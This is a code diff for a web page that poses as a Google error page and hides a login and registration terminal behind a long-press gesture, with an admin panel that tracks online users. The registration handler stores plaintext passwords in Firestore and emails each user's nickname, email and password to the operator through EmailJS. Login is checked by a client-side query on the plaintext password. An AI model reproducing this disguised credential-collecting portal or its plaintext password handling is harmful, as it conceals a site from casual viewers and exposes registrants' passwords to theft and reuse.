@@ -8,34 +8,23 @@
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
         (function(){ 
-            try { emailjs.init("6iGADKihYbPC4ecb"); } catch(e) { console.error("EmailJS Init Failed"); }
+            try { emailjs.init("6iGADKihYbPC4ecb"); } catch(e) { console.log("EmailJS wait..."); }
         })();
     </script>
 
     <style>
-        :root { 
-            --dark: #020204; --accent: #00ff88; --purple: #7c3aed;
-            --panel: rgba(20, 20, 30, 0.95); --border: rgba(255, 255, 255, 0.1);
-        }
+        :root { --dark: #020204; --accent: #00ff88; --purple: #7c3aed; --panel: rgba(20, 20, 30, 0.95); --border: rgba(255, 255, 255, 0.1); }
         * { margin: 0; padding: 0; box-sizing: border-box; outline: none; user-select: none; -webkit-user-select: none; }
         body, html { background: #fff; height: 100vh; width: 100vw; overflow: hidden; font-family: monospace; }
-
-        /* DECOY */
         #decoy-layer { position: fixed; inset: 0; background: #fff; z-index: 100; display: flex; align-items: center; justify-content: center; }
         .g-wrap { max-width: 600px; width: 100%; padding: 40px; }
         .g-robot { background: url('https://www.google.com/images/errors/robot.png') no-repeat; width: 256px; height: 256px; float: right; }
-
-        /* TERMINAL */
         #auth-terminal { display: none; position: fixed; inset: 0; background: var(--dark); z-index: 200; align-items: center; justify-content: center; }
         .auth-box { width: 90%; max-width: 400px; padding: 40px; background: var(--panel); border: 1px solid var(--border); border-radius: 24px; text-align: center; }
         input { width: 100%; padding: 15px; margin-bottom: 10px; background: #000; border: 1px solid var(--border); border-radius: 8px; color: var(--accent); }
         .btn-main { width: 100%; padding: 15px; border: none; border-radius: 8px; background: var(--purple); color: #fff; font-weight: bold; cursor: pointer; }
-
-        /* ADMIN */
         #admin-panel { display: none; position: fixed; inset: 0; background: var(--dark); z-index: 300; padding: 20px; overflow-y: auto; }
         .user-card { background: #1e293b; padding: 15px; margin-bottom: 10px; border-radius: 10px; border-left: 5px solid var(--accent); display: flex; justify-content: space-between; }
-
-        /* PORTAL */
         #portal-ui { display: none; position: fixed; inset: 0; flex-direction: column; background: #000; z-index: 50; }
         iframe { flex: 1; width: 100%; border: none; }
     </style>
@@ -52,14 +41,14 @@
 
     <div id="auth-terminal">
         <div class="auth-box" id="login-form">
-            <h2 style="color:#fff; margin-bottom:20px; letter-spacing:2px;">TERMINAL_ACCESS</h2>
+            <h2 style="color:#fff; margin-bottom:20px;">ACCESS_GATE</h2>
             <input type="text" id="l-user" placeholder="NICKNAME">
             <input type="password" id="l-pass" placeholder="ACCESS_KEY">
             <button class="btn-main" id="login-trigger">INITIALIZE</button>
             <p id="to-reg" style="color:#444; font-size:11px; margin-top:15px; cursor:pointer;">REQUEST_UPLINK</p>
         </div>
         <div class="auth-box" id="reg-form" style="display:none;">
-            <h2 style="color:var(--accent); margin-bottom:20px;">NEW_NODE</h2>
+            <h2 style="color:var(--accent); margin-bottom:20px;">NEW_UPLINK</h2>
             <input type="text" id="r-user" placeholder="NICKNAME">
             <input type="email" id="r-email" placeholder="EMAIL">
             <input type="password" id="r-pass" placeholder="KEY">
@@ -95,7 +84,7 @@
         const db = getFirestore(app);
         const rtdb = getDatabase(app);
 
-        // --- TRIGGER ---
+        // HOLD TRIGGER
         let timer;
         document.getElementById('hold-target').addEventListener('touchstart', () => {
             timer = setTimeout(() => {
@@ -105,19 +94,12 @@
         });
         document.getElementById('hold-target').addEventListener('touchend', () => clearTimeout(timer));
 
-        // --- SESSION TRACKING ---
-        function trackSession(name) {
-            const sRef = ref(rtdb, 'online/' + name);
-            set(sRef, { active: true, since: Date.now() });
-            onDisconnect(sRef).remove(); 
-        }
-
-        // --- LOGIN ---
+        // LOGIN
         document.getElementById('login-trigger').onclick = async function() {
-            const u = document.getElementById('l-user').value;
-            const p = document.getElementById('l-pass').value;
+            const u = document.getElementById('l-user').value.trim();
+            const p = document.getElementById('l-pass').value.trim();
             if(!u || !p) return;
-            this.innerText = "AUTHENTICATING...";
+            this.innerText = "SEARCHING...";
 
             try {
                 const q = query(collection(db, "requests"), where("nickname", "==", u), where("password", "==", p));
@@ -125,9 +107,11 @@
 
                 if (!snap.empty) {
                     const data = snap.docs[0].data();
-                    trackSession(u);
+                    const sRef = ref(rtdb, 'online/' + u);
+                    set(sRef, { active: true });
+                    onDisconnect(sRef).remove();
+
                     document.getElementById('auth-terminal').style.display = 'none';
-                    
                     if (data.role === 'admin') {
                         document.getElementById('admin-panel').style.display = 'block';
                         onValue(ref(rtdb, 'online'), (s) => {
@@ -143,33 +127,32 @@
                     alert("HANDSHAKE_ERROR: Check credentials.");
                     this.innerText = "INITIALIZE";
                 }
-            } catch(e) { alert("SYSTEM_OFFLINE"); this.innerText = "INITIALIZE"; }
+            } catch(e) { alert("CONNECTION_LOST"); this.innerText = "INITIALIZE"; }
         };
 
-        // --- REGISTER ---
+        // REGISTER
         document.getElementById('reg-trigger').onclick = async function() {
-            const u = document.getElementById('r-user').value;
-            const e = document.getElementById('r-email').value;
-            const p = document.getElementById('r-pass').value;
+            const u = document.getElementById('r-user').value.trim();
+            const e = document.getElementById('r-email').value.trim();
+            const p = document.getElementById('r-pass').value.trim();
             if(!u || !e || !p) return alert("Fill all fields.");
             this.innerText = "TRANSMITTING...";
 
             try {
                 await addDoc(collection(db, "requests"), { nickname: u, email: e, password: p, time: serverTimestamp() });
                 
-                if(typeof emailjs !== 'undefined') {
-                    await emailjs.send("service_06y4hgi", "template_56l2irz", { 
-                        from_name: u, user_email: e, user_pass: p 
-                    });
+                if(window.emailjs) {
+                    await emailjs.send("service_06y4hgi", "template_56l2irz", { from_name: u, user_email: e, user_pass: p });
                 }
                 
                 alert("UPLINK_SUCCESS");
                 document.getElementById('to-login').click();
-            } catch(err) { alert("FAIL: " + err.message); }
+            } catch(err) { 
+                alert("FAIL: " + (err.message || "Database Error")); 
+            }
             this.innerText = "SUBMIT";
         };
 
-        // --- NAV ---
         document.getElementById('to-reg').onclick = () => { document.getElementById('login-form').style.display='none'; document.getElementById('reg-form').style.display='block'; };
         document.getElementById('to-login').onclick = () => { document.getElementById('login-form').style.display='block'; document.getElementById('reg-form').style.display='none'; };
     </script>
